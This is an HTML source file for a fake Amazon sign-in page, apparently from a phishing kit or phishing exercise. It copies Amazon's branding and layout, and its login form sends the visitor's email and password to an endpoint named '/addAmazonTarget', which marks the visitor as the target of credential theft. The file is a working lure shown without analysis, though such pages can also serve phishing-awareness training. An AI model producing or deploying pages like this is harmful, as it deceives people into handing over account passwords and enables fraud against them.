<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
  <meta charset="utf-8">
  <title>Amazon</title>
  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css" integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">
</head>
<link rel="stylesheet" href="./styles/amazon.css">

<body>
  <header>
    <div class="d-flex flex-row justify-content-center">
      <div class="row">
        <div class="col-md">
          <img class="img_1" src="./img/zz_amazon-logo.png" alt="Amazon Logo"/>
        </div>
      </div>
    </div>
  </header>

  <div class="d-flex flex-row justify-content-center">
    <div class="row">
      <div class="col-md">
        <form action="/addAmazonTarget" method="post" id="loginForm">
          <div class="sign-in">Sign In</div>

          <div class="form-group">
            <label id="words_1" for="exampleInputEmail1">Email or mobile phone number</label>
            <input type="email" class="form-control" id="exampleInputEmail1" name="email" aria-describedby="emailHelp" placeholder="Enter email or mobile phone number">
            <small id="emailHelp" class="form-text text-muted"></small>
          </div>

          <div class="form-group">
            <label id="words_2" for="exampleInputPassword1">Password</label>
            <input type="password" class="form-control" id="exampleInputPassword1" name="password" placeholder="Password">

            <div class="form-group">
              <p class="keep-sign-in">Keep me signed in. </p>
              <input type="checkbox" class="form-check-input checkbox" id="exampleCheck1">
              <button type="submit" class="btn btn-warning" id="sign-in">Sign In </button>
              <p class="forgot-password">Forgot your password? <a href="https://stupidlink.com">Details</a></p>
              <hr class="solid"></hr>
            </div>
          </div>

          <div class="form-check"></div>
          <button type="button" class="btn btn-warning" id="grey-button">Create your Amazon account</button>
        </form>
      </div>
    </div>
  </div>

  <div class="d-flex flex-row justify-content-center footer_1">
    <div class="row">
      <div class="col">
        <p class="conditions"><a>Conditions of Use &nbsp &nbsp &nbsp </a>   <a>Privacy Notice&nbsp &nbsp &nbsp </a>   <a>Help&nbsp &nbsp &nbsp </a></p>
      </div>
    </div>
  </div>
  <script src="./js/amazon.js"></script>
</body>
</html>
